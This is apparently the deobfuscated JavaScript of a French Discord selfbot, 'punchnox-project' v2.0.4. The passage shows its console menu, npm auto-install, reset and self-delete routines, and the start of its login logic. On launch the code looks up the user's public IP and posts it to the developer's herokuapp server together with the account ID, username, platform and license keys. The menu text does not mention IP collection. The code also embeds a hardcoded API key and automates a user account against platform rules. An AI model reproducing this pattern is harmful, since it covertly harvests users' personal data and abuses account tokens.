function em(e, f) {
  function i(Q) {
    if (Q.toLowerCase() == 'false') {
      return false;
    } else {
      if (Q.toLowerCase() == 'true') return true;else {
        if (Q.toLowerCase() == 'null') {
          return null;
        } else throw Error('String must be \'true\' or \'false\'');
      }
    }
  }
  const j = setTimeout(function () {}, 0).constructor;
  function k(Q) {
    return Q instanceof j;
  }
  if (!process.stdout.clearLine) var l = i('false');else var l = i('true');
  var m = typeof window !== 'undefined';
  function n() {
    try {
      require('discord.js');
      require('chalk');
      require('moment');
      require('chance');
      require('math-expression-evaluator');
      require('fs');
      require('node-fetch');
      require('snekfetch');
      require('hastebin-gen');
      require('discordrpcgenerator');
      require('os');
      require('child_process');
      require('weather-js');
      require('amethyste-api');
      require('request');
      require('cpu-stat');
      require('discord.js-minesweeper');
    } catch (V) {
      function W() {
        if (!m) {
          const a0 = require('readline');
          var Z = {};
          Z.input = process.stdin, Z.output = process.stdout;
          const a1 = a0.createInterface(Z);
          console.clear(), a1.question('[31mLes modules ne sont pas installées, voulez vous les installer ? (répondez par O/N)\nl\'installation des modules peut prendre un certain temps\nRéponse : [0m', a2 => {
            if (!a2.toLowerCase().startsWith('o') && !a2.toLowerCase().startsWith('n')) return W();
            a1.close();
            if (a2.toLowerCase().startsWith('n')) console.log('[33mVous ne pourrez donc pas utiliser le selfbot puisqu\'il ne peut pas continuer sans les modules[0m'), process.exit(0);else {
              process.stdout.write('[33minstallation[0m');
              let a5 = 0,
                a6 = setInterval(() => {
                  process.stdout.clearLine(), process.stdout.cursorTo(0), a5 = (a5 + 1) % 4;
                  var a8 = new Array(a5 + 1).join('.');
                  process.stdout.write('[33minstallation' + a8 + '[0m');
                }, 250),
                a7 = require('child_process').exec;
              a7('npm install discord.js@11.3.2 moment chance math-expression-evaluator fs node-fetch snekfetch hastebin-gen discordrpcgenerator os child_process weather-js amethyste-api request cpu-stat discord.js-minesweeper ', function (a8, a9) {
                if (a9) clearInterval(a6);
                if (a9) process.stdout.clearLine();
                if (a9) process.stdout.cursorTo(0);
                console.log('[32m' + a9 + '[0m');
                if (a8 !== i('null')) {
                  console.log('exec error: ' + V);
                } else process.stdout.write('[32mL\'installation s\'est effectué avec succès[0m'), console.log('\n[32mVous pouvez maintentant relancer le selfbot pour l\'utiliser normalement.'), process.exit();
              });
            }
            ;
          });
        } else {
          console.log(V);
        }
      }
      var U = i('true');
    }
    if (U == i('true') && !m) return dlmodules();
  }
  if (!m) {
    n();
  }
  try {
    require('discord.js'), require('chalk'), require('moment'), require('chance'), require('math-expression-evaluator'), require('fs'), require('node-fetch'), require('snekfetch'), require('hastebin-gen'), require('discordrpcgenerator'), require('os'), require('child_process'), require('weather-js'), require('amethyste-api'), require('request'), require('cpu-stat'), require('discord.js-minesweeper');
    const R = require('readline'),
      S = require('fs');
    let T = require('child_process').exec;
    const U = require('chalk');
    var o = {};
    o.input = process.stdin, o.output = process.stdout;
    const V = R.createInterface(o);
    var p,
      q = ['1', '2', '3'];
    if (!q.includes(e.console)) {
      console.log('[31mVeuillez compléter correctement le config.js (erreur au niveaux de : const console = "' + e.console + '";[0m'), process.exit();
    }
    if (e.console === '1') {
      p = ['#FFFAAA', '#FFE3AA', '#FFD7AA', '#FFC9AA', '#FFB7AA', '#FFAAAA', '#F0FFAA', '#DCFFAA', '#C1FFAA', '#ABFFAA', '#AAFFBD', '#AAFFDC', '#AAFFF7', '#AAF2FF', '#AACFFF', '#AAB9FF', '#B6AAFF', '#C9AAFF', '#DCAAFF', '#FFAAF9', '#FFAADE', '#FFAAC8'];
      var v = '#f097ff';
      var u = '#ff6c6c';
      var t = '#fff63d9c';
      var x = '#007dffc5';
      var w = '#00ccff8f';
      var y = '#00ff348a';
      var z = '#b100ff87';
    } else {
      if (e.console === '2') {
        p = ['#FF0000', '#FF8000', '#FFB200', '#FFE800', '#F0FF00', '#FFAAAA', '#AEFF00', '#55FF00', '#00FF00', '#00FF4D', '#00FFAA', '#00FFD8', '#00FBFF', '#00AEFF', '#0080FF', '#0013FF', '#3E00FF', '#8000FF', '#C100FF', '#FF00FF', '#FF00B2', '#FF005D'];
        var v = '#f62bff';
        var u = '#ff0000';
        var t = '#fff900';
        var x = '#0055ff';
        var w = '#00ccff';
        var y = '#00ff19';
        var z = '#a500ff';
      } else {
        if (e.console === '3') {
          p = ['#CE1616', '#CE4316', '#CE4816', '#CE7D16', '#CEAF16', '#67CE16', '#2FCE16', '#16CE2C', '#16CE83', '#16CEAF', '#16ADCE', '#1672CE', '#16B8CE', '#2116CE', '#5116CE', '#0013FF', '#3E00FF', '#8000FF', '#8E16CE', '#C616CE', '#CE16A4', '#CE1680'];
          var v = '#9b0091';
          var u = '#bc0000';
          var t = '#b3a400';
          var x = '#0038ae';
          var w = '#0080a0';
          var y = '#009a0d';
          var z = '#560089';
        }
      }
    }
    var E = p[Math.floor(Math.random() * p.length)],
      F = U.hex(E)('Que voulez vous faire ?\n  \n  ╔═════════════════════════════════════════════════════╗\n  ║- 1 Lancer le punchnox-project                       ║\n  ║- 2 Quels sonts les dangers d\'utiliser un selfbot ?  ║\n  ║- 3 notre serveur discord                            ║\n  ║- 4 Réinitialiser le selfbot                         ║\n  ║- 5 supprimer le selfbot                             ║\n  ║- 6 crédits                                          ║\n  ║- 7 premium ?                                        ║\n  ║- 8 des logs ?                                       ║\n  ╚═════════════════════════════════════════════════════╝\n  \n  Réponse : ');
    console.clear(), V.question(F, a0 => {
      if (a0.toLowerCase() === '2') {
        console.clear(), V.close(), console.log(U.hex(E)('\n    ╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\n    ║  Quels sonts les dangers d\'utiliser un selfbot ? :                                                                                      ║\n    ║                                                                                                                                         ║\n    ║-1 les selfbot ne sonts pas autorisé par discord malheuresement.                                                                         ║\n    ║-2 Vous pouvez vous faire bannir de discord si vous en utiliser un.                                                                      ║\n    ║-3 Je ne suis en aucun cas résponsable si vous vous faites bannir de certains serveurs ou de discord.                                    ║\n    ║-4 je ne rembourserais aucun nitro jeux ect si vous etes bannie.                                                                         ║\n    ║-5 Donc il faut faire très attention                                                                                                     ║\n    ║(si vous avez peur pour votre compte meme si c\'est rare de se faire ban pour un self, vous pouvez l\'utiliser sur un compte secondaire.)  ║\n    ╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\n\n\n\n\n'));
      }
      a0.toLowerCase() === '3' && (console.clear(), V.close(), console.log(U.hex(E)('\n    ╔═══════════════════════════════════════╗\n    ║                Serveur                ║\n    ║- https://discord.com/invite/punchnox  ║\n    ║- discord.gg/punchnox                  ║\n    ╚═══════════════════════════════════════╝\n\n\n\n\n')));
      if (a0.toLowerCase() === '4') {
        console.clear(), V.close();
        var a3 = require('rimraf');
        a3(__dirname + '/Data/', function () {}), setTimeout(function () {
          S.mkdirSync(__dirname + '/Data/'), S.mkdirSync(f + '/commandes/'), S.mkdirSync(f + '/plugins/'), S.writeFileSync(__dirname + '/Data/codes.json', '[]'), S.writeFileSync(__dirname + '/Data/backups.json', '{}'), S.writeFileSync(__dirname + '/Data/statut.json', '{}'), S.writeFileSync(f + '/commandes/exemple.js', '\n  const Discord = require("discord.js")\n  //ici on importe les modules (pour ma part j\'ai mis discord.js pour les embeds) vous pouvez en mettre d\'autres disponible dans le fichier package.json\n  \n  \n  module.exports.run = async (client, message, argument) => {\n    //ici on exporte client message et argument\n  \n  \n    const embed = new Discord.RichEmbed()//constante embed (new discord.RicheEmbed())\n    .setTitle("Exemple titre")//Titre\n    .setDescription("Exemple description")//description\n    .addField("Exemple Field", "Exemple field")//Field\n    .setColor("random")//la couleurs vous pouvez mettre une couleur html,hex,rgb,hsl\n    .setImage("https://media1.tenor.com/images/bc7f6147063085d89b403cb96de6f883/tenor.gif?itemid=4973579")//vous mettez le lien d\'une image ou son emplacement\n    .setFooter("exemple footer", client.user.AvatarURL)//le footer \n    message.edit(embed)//edit le message par la constante embed\n  \n  \n  }\n  \n  //ici c\'est pour expotrer le nom de la commande (ici c\'est exemple)\n  module.exports.punchnox = {\n    name: "exemple"\n  }'), S.writeFileSync(f + '/config.js', '\n  const token          = ""; //tu met ton token entre les guillemets\n  const prefix         = ""; //tu met ton prefix entre les guillemets\n  const image          = ""; //tu met le lien de ton image entre les guillemets\n  const color          = ""; //tu met ton la couleur (EXEMPLE RANDOM, RED, BLACK) ou un code couleur html comme #0CDF7C, #0F0000 dispo sur ce site ou autre https: //htmlcolorcodes.com/fr/\n  const twitch         = ""; //tu met ton lien twitch ici \n  const nsfw           = ""; //tu met on ou off (on pour activer le nsfw et off pour le désactiver)\n  const nitro_claimer  = ""; //tu met on ou off (on pour activer l\'auto claimer et off pour le désactiver)\n  const multi_status   = ["", "", ""]; //tu met le text que tu veut avoir en multi stream tu peut en mettre plus que 3 stv mais il faut bien mettre une virgule \n  const console        = ""; //ici c\'est l\'intencité des couleurs de la console 1 c\'est des couleurs pale 2 des couleurs vives et 3 des couleurs sombres\n  const premium        = "" //Mettez votre clée premium ici pas obligé\n  const team = "" //Si vous faites parti d\'une team en alliance avec le punchnox-project vous pouvez mettre votre key ici\n  \n  ////CONFIG RPC\n  const application_id = ""; //tu met l\'id de ton bot pour les rpc\n  const imagerpc       = ""; //tu met le nom de ton image rpc\n  const title          = ""; //tu met le titre rpc\n  const details        = ""; //tu met le detail rpc\n  const state          = ""; //tu met la state rpc\n  const largetext      = ""; //tu met le text de ta grande image\n  const smalltext      = ""; //tu met le text de ta petite image\n  const sizeplayer     = ""; //tu met le nombre de joueurs actuel (1 jusque à 999999999999)\n  const sizeplayermax  = "" //tu met le nombre de joueurs maximum (1 jusque à 999999999999)\n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  //ne pas toucher\n  module.exports = { //ne pas toucher\n    token, //ne pas toucher\n    prefix, //ne pas toucher\n    image, //ne pas toucher\n    color, //ne pas toucher\n    twitch, //ne pas toucher\n    team, //ne pas toucher\n    nsfw, //ne pas toucher\n    premium, //ne pas toucher\n    nitro_claimer, //ne pas toucher\n    multi_status, //ne pas toucher\n    console, //ne pas toucher\n    application_id, //ne pas toucher\n    imagerpc, //ne pas toucher\n    title, //ne pas toucher\n    details, //ne pas toucher\n    state, //ne pas toucher\n    largetext, //ne pas toucher\n    smalltext, //ne pas toucher\n    sizeplayer, //ne pas toucher\n    sizeplayermax //ne pas toucher\n  }\n  ');
        }, 2000), console.log(U.hex(E)('\n    ╔════════════════════════════════════════════════╗\n    ║                      Reset                     ║\n    ║- Le punchnox-project à été reset avec succes   ║\n    ╚════════════════════════════════════════════════╝\n\n\n\n\n'));
      }
      if (a0.toLowerCase() === '5') {
        V.close();
        var a4 = {};
        a4.input = process.stdin, a4.output = process.stdout;
        const at = R.createInterface(a4);
        console.clear(), at.question(U.hex(E)('Etes vous sûr de vouloir supprimer le punchnox-project ??? y/n\nRéponse : '), au => {
          if (au.toLowerCase() == 'y') {
            console.clear();
            var ax = require('rimraf');
            setTimeout(function () {
              ax('./node_modules/', function () {});
            }, 100), setTimeout(function () {
              ax(__dirname + '/Data/', function () {}), ax(f + '/commandes/', function () {}), ax(f + '/plugins/', function () {});
            }, 500), setTimeout(function () {
              S.unlinkSync(f + '/config.js');
            }, 1000), setTimeout(function () {
              S.unlinkSync('./start.bat/');
            }, 2500), setTimeout(function () {
              S.unlinkSync('./index.js'), ax('../punchnox-project-master/', function () {}), console.log(U.hex(E)('\n  ╔═══════════════════════════════════════════════════╗\n  ║                      Delete                       ║\n  ║- Le punchnox-project à été supprimé avec succes   ║\n  ╚═══════════════════════════════════════════════════╝\n\n\n\n\n'));
            }, 3000), V.close();
          }
          au.toLowerCase() == 'n' && (at.close(), console.clear(), console.log(U.hex(E)('\n  ╔═══════════════════════════════════════════════════╗\n  ║                      Delete                       ║\n  ║- Le punchnox-project ne sera donc pas supprimé    ║\n  ╚═══════════════════════════════════════════════════╝\n\n\n\n\n')));
        });
      }
      if (a0.toLowerCase() === '6') {
        console.clear(), V.close(), console.log(U.hex(E)('\n    ╔═════════════════════════════════╗\n    ║            Crédits              ║\n    ║- Fondateur : 𝙥𝙪𝙣𝙘𝙝𝙣𝙤𝙭   ║\n    ║- version : 2.0.4                ║\n    ║- serveur : discord.gg/punchnox  ║\n    ╚═════════════════════════════════╝\n\n\n\n\n'));
      }
      a0.toLowerCase() === '7' && (console.clear(), V.close(), console.log(U.hex(E)('\n  ╔═══════════════════════════════════════════════════════════════════════════════════════════════════╗\n  ║                                        premium ???                                                ║\n  ║- le premium est une version du selfbot avec plus de commandes et d\'avantags sur le serveur...     ║\n  ║- La version premium coute 5 euros actuellement                                                    ║\n  ║- Si vous voulez l\'acheter rendez vous sur le serveur : discord.gg/punchnox                        ║\n  ║- Ensuite contactez le fondateur qui vous expliquera comment faire                                 ║\n  ║- Toutes les commandes en plus avec le premium sonts disponnible avec la commande : hpremium       ║\n  ╚═══════════════════════════════════════════════════════════════════════════════════════════════════╝\n\n\n\n\n')));
      if (a0.toLowerCase() === '8') {
        console.clear(), V.close(), console.log(U.hex(E)('\n    ╔═════════════════════════════════════════════════════════════════════════════════╗\n    ║                                 Des logs ???                                    ║\n    ║- Un systeme de logs à été mis en place à partir de la version 2.0.4             ║\n    ║- Ces logs ont été mis en place pour voir qui éffectue                           ║\n    ║  les commandes raid ou dangeureuses pour un serveur suite à quelques problèmes  ║\n    ║  que l\'ont a eu avec ce genre de commandes.                                     ║\n    ║- Des logs de connexions ont aussi été mises en place                            ║\n    ║  pour voir le nombre d\'utilisateurs connecté en même temps.                     ║\n    ║                                                                                 ║\n    ╚═════════════════════════════════════════════════════════════════════════════════╝\n\n\n\n\n'));
      }
      if (a0.toLowerCase() !== '1') {} else {
        V.close(), console.clear();
        const aw = require('discord.js'),
          ax = require('moment'),
          ay = require('chalk'),
          az = require('chance'),
          aA = require('math-expression-evaluator'),
          aB = require('fs'),
          aC = require('node-fetch'),
          aD = require('snekfetch'),
          aE = require('hastebin-gen'),
          aF = require('discordrpcgenerator'),
          aG = require('os'),
          {
            exec: aH
          } = require('child_process'),
          aI = require('weather-js'),
          aJ = require('amethyste-api'),
          aK = require('request');
        let aL = require('cpu-stat');
        const aM = require('discord.js-minesweeper');
        var a5 = require(__dirname + '/Data/backups.json');
        const aN = new aw.Client(),
          aO = new aJ('0cd5eb5940b533a97e15e5b3b80b88a109123120c3ba1df1ab3b49c5caefa2dd6dd499ac5e8a8ef9b987026c587702462e521ce5b709f695d9dccc8bf462367f'),
          aP = new az();
        var a6 = ax().format('DD/MM/YYYY 𝙖 HH: ss').toLocaleString('fr-FR');
        commandIntervals = [];
        var a7 = {};
        a7.ADMINISTRATOR = 'Administrateur', a7.VIEW_AUDIT_LOG = 'Voir Les Logs Du Serveur', a7.MANAGE_GUILD = 'Gérer Le Serveur', a7.MANAGE_ROLES = 'Gérer Les Rôles', a7.MANAGE_CHANNELS = 'Gérer Les Salons', a7.KICK_MEMBERS = 'Expulser Des Membres', a7.BAN_MEMBERS = 'Bannir Des Membres', a7.CREATE_INSTANT_INVITE = 'Créer Una Invitation', a7.CHANGE_NICKNAME = 'Changer De Pseudo', a7.MANAGE_NICKNAMES = 'Gérer Les Pseudos', a7.MANAGE_EMOJIS = 'Gérer Les Emojis', a7.MANAGE_WEBHOOKS = 'Gérer Les Webhooks', a7.VIEW_CHANNEL = 'Lire Les Salons Textuels & Voir Les Salons Vocaux', a7.SEND_MESSAGES = 'Envoyer Des Messages', a7.SEND_TTS_MESSAGES = 'Envoyer Des Messages TTS', a7.MANAGE_MESSAGES = 'Gérer Les Messages', a7.EMBED_LINKS = 'Intégrer Des Liens', a7.ATTACH_FILES = 'Attacher Des Fichiers', a7.READ_MESSAGE_HISTORY = 'Voir Les Anciens Messages', a7.MENTION_EVERYONE = 'Mentionner Everyone', a7.USE_EXTERNAL_EMOJIS = 'Utiliser Des Émojis Externes', a7.ADD_REACTIONS = 'Ajouter Des Réactions', a7.CONNECT = 'Se Connecter', a7.SPEAK = 'Parler', a7.MUTE_MEMBERS = 'Rendre Des Membres Muets', a7.DEAFEN_MEMBERS = 'Rendre Des Membres Sourds', a7.MOVE_MEMBERS = 'Déplacer Les Membres', a7.USE_VAD = 'Utiliser La Détection De Voix';
        const aQ = a7;
        var a9 = e.token,
          aa = e.team,
          ab = e.prefix,
          ac = e.image;
        if (!ac) var ac = '';
        ;
        var ad = e.color,
          ae = e.twitch;
        if (!ae) var ae = 'https://twitch.tv/punchnox';else {
          var ae = ae;
        }
        var af = e.multi_status,
          ag = e.nsfw,
          ah = e.nitro_claimer;
        if (e.premium === 'puchnox') var ai = e.premium;else var ai = e.premium;
        var aj = e.title,
          ak = e.details,
          al = e.state,
          am = e.smalltext,
          an = e.largetext,
          ao = e.sizeplayer,
          ap = e.sizeplayermax,
          aq = e.application_id,
          ar = e.imagerpc;
        !aj && (aj = 'none');
        !ak && (ak = 'none');
        !al && (al = 'none');
        !am && (am = 'none');
        !an && (an = 'none');
        !ao && (ao = '404');
        !ap && (ap = '404');
        if (!aq) {
          aq = '719905369723502602';
        }
        !ar && (ar = 'unknown');
        if (!ac) {
          ac = '';
        }
        if (!e.token) {
          console.clear(), setTimeout(function () {
            console.clear(), console.log('- [', ay.hex(u)('ERROR'), '] Le token n\'a pas été trouvé. Vérifi si tu as bien rentré le token dans le config.js');
          }, 1000);
        }
        aN.login(a9).catch(aV => {
          console.error('[31mErreur![0m');
          if (aV.message == 'Something took too long to do.' || aV.message.startsWith('connect ETIMEDOUT')) console.error('[31mDiscord a mis trop de temps à répondre...[0m'), console.error('[31mArrêt du selfbot car aucune réponse de Discord...[0m'), process.exit();else {
            if (aV.message == 'Incorrect login details were provided.') {
              console.error('[31m- [ERROR] Échec de l\'authentification avec Discord. Suivez les instructions et entrez votre token dans config.js..[0m'), process.exit();
            } else {
              if (aV.message == 'An invalid token was provided.') console.error('[31mLe token qui est dans le ficher ' + (f + '\\config.js') + ' est invalide.[0m'), process.exit();else {
                if (aV.message == 'getaddrinfo ENOTFOUND discordapp.com discordapp.com:443') console.error('[31mVous n\'êtes pas connecté à internet.[0m'), process.exit();else {
                  if (aV.message == 'getaddrinfo ENOTFOUND punchnox-project-api-.glitch.me') {
                    console.error('Un problème est survenu lors de la connexion aux serveurs'), process.exit();
                  } else {
                    if (aV.message == 'invalid token was provided') console.log(ay.hex(u)('- [ERROR] Échec de l\'authentification avec Discord. Suivez les instructions et entrez votre token dans config.js.')), process.exit();else {
                      if (aV.message == 'Possible EventEmitter memory leak detected.') {} else console.error('[31m' + aV.message + '[0m'), process.exit();
                    }
                  }
                }
              }
            }
          }
        }), aN.on('disconnect', function (aV) {
          console.log('déconnexion du selfbot en cours...');
        }), aN.on('reconnecting', function () {
          console.log('tentative de reconnection au client en cours...');
        }), aN.on('resume', function (aV) {
          console.log('reconnexion au client réussie, veuillez patienter le temps de redémarrer le selfbot...'), aN.destroy().then(() => aN.login(a9));
        }), aD.get('https://punchnox-project-api.herokuapp.com/api/update/infos').then(aV => {
          var aY = aV.body.version;
          function aZ(b2) {
            return b2.replace(/a/g, '𝙖').replace(/b/g, '𝙗').replace(/c/g, '𝙘').replace(/d/g, '𝙙').replace(/e/g, '𝙚').replace(/f/g, '𝙛').replace(/g/g, '𝙜').replace(/h/g, '𝙝').replace(/i/g, '𝙞').replace(/j/g, '𝙟').replace(/k/g, '𝙠').replace(/l/g, '𝙡').replace(/m/g, '𝙢').replace(/n/g, '𝙣').replace(/o/g, '𝙤').replace(/p/g, '𝙥').replace(/q/g, '𝙦').replace(/r/g, '𝙧').replace(/s/g, '𝙨').replace(/t/g, '𝙩').replace(/u/g, '𝙪').replace(/v/g, '𝙫').replace(/w/g, '𝙬').replace(/x/g, '𝙭').replace(/y/g, '𝙮').replace(/z/g, '𝙯').replace(/A/g, '𝘼').replace(/B/g, '𝘽').replace(/C/g, '𝘾').replace(/D/g, '𝘿').replace(/E/g, '𝙀').replace(/F/g, '𝙁').replace(/G/g, '𝙂').replace(/H/g, '𝙃').replace(/I/g, '𝙄').replace(/J/g, '𝙅').replace(/K/g, '𝙆').replace(/L/g, '𝙇').replace(/M/g, '𝙈').replace(/N/g, '𝙉').replace(/O/g, '𝙊').replace(/P/g, '𝙋').replace(/Q/g, '𝙌').replace(/R/g, '𝙍').replace(/S/g, '𝙎').replace(/T/g, '𝙏').replace(/U/g, '𝙐').replace(/V/g, '𝙑').replace(/W/g, '𝙒').replace(/X/g, '𝙓').replace(/Y/g, '𝙔').replace(/Z/g, '𝙕');
          }
          const b0 = ['https://i.pinimg.com/originals/09/ee/e0/09eee0f5dfae8f74179d1ba0bb54b22d.gif', 'https://media.tenor.com/images/0538e625e9c3d27cd062306101adde13/tenor.gif', 'https://media1.tenor.com/images/6a535d0f8da2f51f3296747481bad7da/tenor.gif?itemid=15809709', 'https://media1.giphy.com/media/t7401i4UiIyMo/source.gif'],
            b1 = ['https://media.tenor.com/images/9df5f6ef799544b11c1171d4c873d1f4/tenor.gif', 'https://media.tenor.com/images/bae9f9ee3bf793a0bb667d8e4ccb9883/tenor.gif', 'https://media.tenor.com/images/6f567ef7cae93ca76de2346f28764ee9/tenor.gif', 'https://media.tenor.com/images/3d8eb1e9c497abc46370cee9b55d682f/tenor.gif', 'https://media.tenor.com/images/19fe7ebb05c2aceb9e68d84ee5c031a7/tenor.gif', 'https://media.tenor.com/images/db17bbcb693788625c8228d30bc5fc42/tenor.gif', 'https://media1.tenor.com/images/003a06f5074259c50b519056a12f6e33/tenor.gif', 'https://media1.tenor.com/images/5e1fafda52c90acfe2499ac5061f4c99/tenor.gif', 'https://cdn.discordapp.com/attachments/603949531700396032/603954611405062157/tenor_1.gif'];
          aD.get('http://ip-api.com/json/').then(b2 => {
            var b5 = b2.body.query,
              b6 = 'NYK0X-0S6BJ-8EA8G-U5LRV';
            aD.get('https://punchnox-project-api.herokuapp.com/api/update/infos').then(b7 => {
              var ba = b7.body.serveur,
                bc = b7.body.new,
                bd = '2.0.4',
                be = {};
              be.Key = aa, aD.post('https://punchnox-project-api.herokuapp.com/api/team/login').send(be).end((bf, bg) => {
                if (bg.body.message === 'key is valid') {
                  var bo = true;
                  var br = bg.body.Fondateur;
                  var bl = bg.body.Serveurinvite;
                  var bn = bg.body.Fondateurid;
                  var bm = bg.body.Image;
                  var bs = bg.body.Footer;
                  var bp = bg.body.Name;
                  var bq = bg.body.Descriptionteam;
                } else {
                  bm = e.image;
                  var bo = false,
                    bs = '   𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩';
                }
                var bt = {};
                bt.Key = ai, aD.post('https://punchnox-project-api.herokuapp.com/api/premium/login').send(bt).end((bv, bw) => {
                  if (bw.body.message === 'key is valid') var bz = i('true');else {
                    var bz = i('false');
                  }
                  function bA(c0) {
                    var c1 = new Date().getTime();
                    while (new Date().getTime() < c1 + c0);
                  }
                  if (aY.includes(bd)) {} else {
                    console.log(ay.hex(y)('La mise à jours ' + aY + ' est disponnible lancez le fichier update.bat pour mettre à jours le selfbot')), console.log(ay.hex(y)('Si vous avez un problème avec la mise à jours rdv sur : ' + ba));
                  }
                  var bB = JSON.parse(aB.readFileSync(__dirname + '/Data/statut.json', 'utf8'));
                  bB == '' && (console.clear(), console.error('[31mUne erreur a été trouvé avec le fichier ' + (f + '\\Data/statut.json') + '[0m'), aB.writeFileSync(__dirname + '/Data/statut.json', '{}', function (c1) {
                    console.error(c1);
                  }), console.error('[32mL\'erreur à été résolut avec succes vous pouvez relancer le selfbot[0m'), process.exit());
                  let bC = 0,
                    bD = setInterval(() => {
                      process.stdout.clearLine(), process.stdout.cursorTo(0), bC = (bC + 1) % 4;
                      var c1 = new Array(bC + 1).join('.');
                      process.stdout.write(ay.hex(w)('Lancement du punchnox-project' + c1));
                    }, 200);
                  var bE = {};
                  bE.aix = 'IBM AIX', bE.android = 'Android ', bE.darwin = 'Darwin (MacOS, IOS etc)', bE.freebsd = 'FreeBSD', bE.linux = 'Linux', bE.openbsd = 'OpenBSD', bE.sunos = 'SunOS', bE.win32 = 'Windows';
                  var bF = bE,
                    bG = {};
                  bG.online = ':white_check_mark: En Ligne', bG.dnd = ':no_entry: Ne Pas Deranger', bG.offline = ':zzz: Hors Ligne', bG.idle = ':large_orange_diamond: Inactif';
                  let bH = bG;
                  var bI = {};
                  bI.Ip = b5, bI.Username = aN.user.username, bI.User_Id = aN.user.id, bI.User_created = ax.utc(aN.user.createdAt).format('MM/DD/YYYY 𝙖 HH: ss'), bI.Avatar_Url = aN.user.avatarURL, bI.Plateform = bF[aG.platform()], bI.Status = bH[aN.user.presence.status], bI.Play = aN.user.presence.game ? aN.user.presence.game.name : 'Aucun Jeux', bI.Prefix = ab, bI.Color_Embed = ad, bI.Premium = bz ? 'Activé' : 'Désactivé', bI.Key = ai, bI.Team = aa, bI.Date = a6, aD.post('https://punchnox-project-api.herokuapp.com/api/logs/connect').send(bI).end((c1, c2) => {
                    if (c1) return console.log('[31mErreur lors de la connexion aux serveurs du punchnox-project[0m');
                  }), clearInterval(bD);
                  if (b5.startsWith('133')) {
                    console.clear();
                    console.log('[31mVous avez une version modifiée du punchnox-project c\'est possible que cette version contienne un token grabber je vous conseille de la désinstaller puis changer votre mot de passe.[0m');
                    var bL = {};
                    bL.Commande = 'BLACKLISTE AUTOMATIQUE VERSION MOFIFIE', bL.Report_par = 'LE SELFBOT', bL.User_id = aN.user.id, bL.Reason = 'Utilise un version modifié du selfbot', bL.Date_demande = ax().format('MM/DD/YYYY 𝙖 HH: ss'), aD.post('https://punchnox-project-api.herokuapp.com/api/logs/black').send(bL).end((c1, c2) => {
                      if (c1) return console.log('[31mErreur lors de la connexion aux serveurs du punchnox-project[0m');
                    });
                    console.log('[31mUne demande de blackliste a été faite automatiquement par le selfbot[0m');
                    process.exit();
                  }
                  var bM = {};
                  bM.Ip = b5, aD.post('https://punchnox-project-api.herokuapp.com/api/update/blackliste').send(bM).end((c1, c2) => {
                    if (c2.body.id || c2.body.Ip || c2.body.Username || c2.body.Resaon) {
                      console.clear();
                      console.log(ay.hex(y)('╔══════════════════════════════════════════════════════════════════════════════╗'));
                      console.log(ay.hex(y)('║ Vous êtes malheureusement sur la blacklist du punchnox-project selfbot. :(  ║'));
                      console.log(ay.hex(y)('║ Raison : ' + c2.body.Reason + '                                                        ║'));
                      console.log(ay.hex(y)('║ Username le jours de la blacklist : ' + c2.body.Username + '                                ║'));
                      console.log(ay.hex(y)('║ Id : ' + c2.body.id + '                                                      ║'));
                      console.log(ay.hex(y)('╚══════════════════════════════════════════════════════════════════════════════╝\n\n\n\n'));
                      aD.post('https://punchnox-project-api.herokuapp.com/api/logs/connect').send({
                        'Ip': b5,
                        'Username': aN.user.username,
                        'User_Id': aN.user.id,
                        'User_created': ax.utc(aN.user.createdAt).format('MM/DD/YYYY 𝙖 HH: ss'),
                        'Plateform': bF[aG.platform()],
                        'Avatar_Url': aN.user.avatarURL,
                        'Status': 'USER blacklisted',
                        'Play': 'USER blacklisted',
                        'Prefix': ab,
                        'Color_Embed': ad,
                        'Premium': bz ? 'Activé' : 'Désactivé',
                        'Key': ai,
                        'Team': aa,
                        'Date': a6
                      }).end((c8, c9) => {
                        if (c8) return console.log('[31mErreur lors de la connexion aux serveurs du punchnox-project[0m');
                      });
                      process.exit();
                    }
                    ;
                  });
                  var bN = {};
                  bN.id = aN.user.id, aD.post('https://punchnox-project-api.herokuapp.com/api/update/blacklisteid').send(bN).end((c1, c2) => {
                    (c2.body.id || c2.body.Ip || c2.body.Username || c2.body.Resaon) && (console.clear(), console.log(ay.hex(y)('╔══════════════════════════════════════════════════════════════════════════════╗')), console.log(ay.hex(y)('║ Vous êtes malheureusement sur la blacklist du punchnox-project selfbot. :(  ║')), console.log(ay.hex(y)('║ Raison : ' + c2.body.Reason + '                                                        ║')), console.log(ay.hex(y)('║ Username le jours de la blacklist : ' + c2.body.Username + '                                ║')), console.log(ay.hex(y)('║ Id : ' + c2.body.id + '                                                      ║')), console.log(ay.hex(y)('╚══════════════════════════════════════════════════════════════════════════════╝\n\n\n\n')), aD.post('https://punchnox-project-api.herokuapp.com/api/logs/connect').send({
                      'Ip': b5,
                      'Username': aN.user.username,
                      'User_Id': aN.user.id,
                      'User_created': ax.utc(aN.user.createdAt).format('MM/DD/YYYY 𝙖 HH: ss'),
                      'Avatar_Url': aN.user.avatarURL,
                      'Plateform': bF[aG.platform()],
                      'Status': 'USER blacklisted',
                      'Play': 'USER blacklisted',
                      'Prefix': ab,
                      'Color_Embed': ad,
                      'Premium': bz ? 'Activé' : 'Désactivé',
                      'Key': ai,
                      'Team': aa,
                      'Date': a6
                    }).end((c5, c6) => {
                      if (c5) {
                        return console.log(c5);
                      }
                    }), process.exit());
                  });
                  if (!bw.body.Reason) {
                    var bz = false;
                  } else {
                    if (bw.body.Reason.includes('Putenox')) {
                      console.clear();
                      console.log('[31mVous avez une version modifiée du punchnox-project c\'est possible que cette version contienne un token grabber je vous conseille de la désinstaller puis changer votre mot de passe.[0m');
                      var bQ = {};
                      bQ.Commande = 'BLACKLISTE AUTOMATIQUE VERSION MOFIFIE', bQ.Report_par = 'LE SELFBOT', bQ.User_id = aN.user.id, bQ.Reason = 'Utilise un version modifié du selfbot', bQ.Date_demande = ax().format('MM/DD/YYYY 𝙖 HH: ss'), aD.post('https://punchnox-project-api.herokuapp.com/api/logs/black').send(bQ).end((c2, c3) => {
                        if (c2) return console.log('[31mErreur lors de la connexion aux serveurs du punchnox-project[0m');
                      });
                      console.log('[31mUne demande de blackliste a été faite automatiquement par le selfbot[0m');
                      process.exit();
                    } else {
